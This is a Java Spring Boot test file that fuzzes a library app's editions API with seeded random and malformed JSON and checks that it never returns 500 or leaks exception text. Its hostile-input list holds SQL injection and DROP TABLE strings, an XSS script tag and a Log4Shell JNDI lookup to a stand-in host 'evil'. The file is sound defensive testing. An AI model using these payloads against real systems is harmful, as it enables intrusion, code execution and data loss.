package io.github.adamstac.libraryapp.library;

import static org.assertj.core.api.Assertions.assertThat;

import io.github.adamstac.libraryapp.ApiBrowser;
import io.github.adamstac.libraryapp.TestcontainersConfiguration;
import java.net.http.HttpResponse;
import java.util.List;
import java.util.Random;
import java.util.UUID;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.context.annotation.Import;
import org.springframework.jdbc.core.simple.JdbcClient;
import org.springframework.security.crypto.password.PasswordEncoder;

/** Random and malicious input to the editions API must never crash it (500) or leak internals. Fixed seed. */
@Import(TestcontainersConfiguration.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT, properties = ApiBrowser.MANY_SIGN_INS)
class EditionHostileInputTests {

    private static final String[] NASTY = {
        "' OR '1'='1", "\"; DROP TABLE editions; --", "<script>alert(1)</script>", "${jndi:ldap://evil/x}",
        "\u0000", "%00", "‮evil", "\uD800", "ﷺ", "😀", "دار المعرفة", "", " ", "\n", "978-0-306-40615-7",
        "٢٠٠٥/١٢٣٤٥", "GBP", "ar", "2024-03-12", "9999-99-99", "NaN", "1e400", "-0"
    };
    private static final String[] TEXT_FIELDS = {"title", "language", "translator", "muhaqqiq", "publisher",
        "publicationPlace", "isbn", "legalDeposit", "shelf", "notes"};
    private static final String[] DATE_FIELDS = {"purchasedOn", "startedOn", "finishedOn"};

    @Value("${local.server.port}")
    private int port;

    @Autowired
    private JdbcClient jdbc;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Test
    void randomFieldValuesNeverCrashTheApi() throws Exception {
        Random random = new Random(20261029L);
        ApiBrowser reader = null;
        String work = null;
        String existing = null;
        for (int i = 0; i < 200; i++) {
            if (i % 40 == 0) { // a fresh account now and then, so the limit on changes a minute isn't reached
                reader = ApiBrowser.newAccount(port, jdbc, passwordEncoder);
                String workPath = reader.post(EditionTests.WORKS, "{\"titleEn\":\"x\"}").headers()
                        .firstValue("Location").orElseThrow();
                work = workPath.substring(workPath.lastIndexOf('/') + 1);
                existing = reader.post(EditionTests.EDITIONS, "{\"workId\":\"" + work + "\"}").headers()
                        .firstValue("Location").orElseThrow();
            }
            String body = randomBody(random, work);

            HttpResponse<String> response = i % 2 == 0
                    ? reader.post(EditionTests.EDITIONS, body)
                    : reader.put(existing, body, "\"" + random.nextInt(3) + "\"");

            assertThat(response.statusCode()).as(body).isIn(200, 201, 400, 409);
            assertThat(response.body()).as(body).doesNotContainIgnoringCase("exception").doesNotContain("trace");
        }
    }

    @Test
    void malformedRequestsAreRejectedCleanly() throws Exception {
        ApiBrowser reader = ApiBrowser.newAccount(port, jdbc, passwordEncoder);
        String workPath = reader.post(EditionTests.WORKS, "{\"titleEn\":\"x\"}").headers().firstValue("Location")
                .orElseThrow();
        String work = workPath.substring(workPath.lastIndexOf('/') + 1);
        String existing = reader.post(EditionTests.EDITIONS, "{\"workId\":\"" + work + "\"}").headers()
                .firstValue("Location").orElseThrow();
        String w = "\"workId\":\"" + work + "\"";
        List<String> bodies = List.of(
                "", "{", "null", "[]", "42", "\"text\"", "<xml/>",
                "{" + w + ",\"volumes\":\"many\"}", "{" + w + ",\"volumes\":1e30}", "{" + w + ",\"volumes\":[1]}",
                "{" + w + ",\"purchasedOn\":\"12/03/2024\"}", "{" + w + ",\"purchasedOn\":20240312}",
                "{" + w + ",\"price\":\"95 GBP\"}", "{" + w + ",\"price\":{\"amount\":\"ninety\",\"currency\":\"GBP\"}}",
                "{" + w + ",\"price\":{\"amount\":{},\"currency\":\"GBP\"}}", "{" + w + ",\"published\":\"1379\"}",
                "{" + w + ",\"isbn\":[\"978\"]}", "{\"workId\":\"not-an-id\"}", "{\"work\":\"Sahih\"}");
        for (String body : bodies) {
            for (HttpResponse<String> response : List.of(
                    reader.post(EditionTests.EDITIONS, body), reader.put(existing, body, "\"0\""))) {
                assertThat(response.statusCode()).as(body).isIn(400, 415);
                assertThat(response.body()).as(body).doesNotContainIgnoringCase("exception");
            }
        }
        assertThat(reader.get(EditionTests.EDITIONS + "/not-an-id").statusCode()).isEqualTo(400);
        assertThat(reader.send("POST", EditionTests.EDITIONS, "{" + w + "}", "text/plain", null, true).statusCode())
                .isEqualTo(415);
        assertThat(reader.put(EditionTests.SETTINGS, "[]", null).statusCode()).isEqualTo(400);
        assertThat(reader.put(EditionTests.SETTINGS, "{\"defaultCurrency\":{}}", null).statusCode()).isEqualTo(400);
    }

    private static String randomBody(Random random, String work) {
        StringBuilder body = new StringBuilder("{\"workId\":");
        body.append(random.nextInt(8) == 0 ? json(UUID.randomUUID().toString()) : json(work));
        for (String field : TEXT_FIELDS) {
            if (random.nextInt(3) == 0) {
                body.append(',').append(json(field)).append(':').append(json(randomText(random)));
            }
        }
        for (String field : DATE_FIELDS) {
            if (random.nextInt(3) == 0) {
                body.append(',').append(json(field)).append(':').append(json(randomDate(random)));
            }
        }
        if (random.nextInt(2) == 0) {
            body.append(",\"volumes\":").append(random.nextInt(1200) - 100);
        }
        if (random.nextInt(2) == 0) {
            body.append(",\"published\":{\"hijri\":").append(random.nextInt(4000) - 1000)
                    .append(",\"ce\":").append(random.nextInt(4000) - 1000).append('}');
        }
        if (random.nextInt(2) == 0) {
            String amount = switch (random.nextInt(4)) {
                case 0 -> json(randomText(random));
                case 1 -> String.valueOf(random.nextDouble() * 2e9 - 1e9);
                case 2 -> json(String.valueOf(random.nextInt(100000) / 100.0));
                default -> "null";
            };
            body.append(",\"price\":{\"amount\":").append(amount)
                    .append(",\"currency\":").append(json(random.nextBoolean() ? "GBP" : randomText(random))).append('}');
        }
        return body.append('}').toString();
    }

    private static String randomDate(Random random) {
        return switch (random.nextInt(4)) {
            case 0 -> "%04d-%02d-%02d".formatted(1850 + random.nextInt(250), 1 + random.nextInt(12), 1 + random.nextInt(28));
            case 1 -> "%04d-%02d-%02d".formatted(random.nextInt(10000), random.nextInt(14), random.nextInt(33));
            case 2 -> randomText(random);
            default -> "2026-01-0" + (1 + random.nextInt(9));
        };
    }

    private static String randomText(Random random) {
        if (random.nextInt(3) == 0) {
            return NASTY[random.nextInt(NASTY.length)];
        }
        int length = random.nextInt(random.nextInt(10) == 0 ? 600 : 40);
        StringBuilder text = new StringBuilder();
        for (int i = 0; i < length; i++) {
            int codePoint = switch (random.nextInt(6)) {
                case 0 -> random.nextInt(0x20); // control characters
                case 1 -> 0x0600 + random.nextInt(0x100); // Arabic block, including Arabic-Indic digits
                case 2 -> 0x2000 + random.nextInt(0x70); // punctuation, including direction controls
                case 3 -> random.nextInt(0x1FFFF); // anything, including emoji and lone surrogates
                case 4 -> '0' + random.nextInt(10); // digits
                default -> 0x20 + random.nextInt(0x5F); // printable ASCII
            };
            text.appendCodePoint(codePoint);
        }
        return text.toString();
    }

    /** JSON string escaping that keeps lone surrogates as \\u escapes, so they reach the API as sent. */
    private static String json(String value) {
        StringBuilder out = new StringBuilder("\"");
        for (char c : value.toCharArray()) {
            if (c == '"' || c == '\\') {
                out.append('\\').append(c);
            } else if (c < 0x20 || Character.isSurrogate(c)) {
                out.append(String.format("\\u%04x", (int) c));
            } else {
                out.append(c);
            }
        }
        return out.append('"').toString();
    }
}
